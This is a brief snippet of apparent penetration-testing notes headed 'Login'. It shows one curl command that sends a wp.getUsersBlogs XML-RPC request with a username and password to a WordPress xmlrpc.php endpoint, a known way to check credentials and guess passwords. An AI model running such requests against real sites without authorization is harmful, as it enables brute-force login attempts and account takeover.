# Login

#### Post request again xmlrpc.php

* {% code overflow="wrap" %}
  ```bash
  curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>PASSWORD</value></param></params></methodCall>" http://example.com/xmlrpc.php
  ```
  {% endcode %}
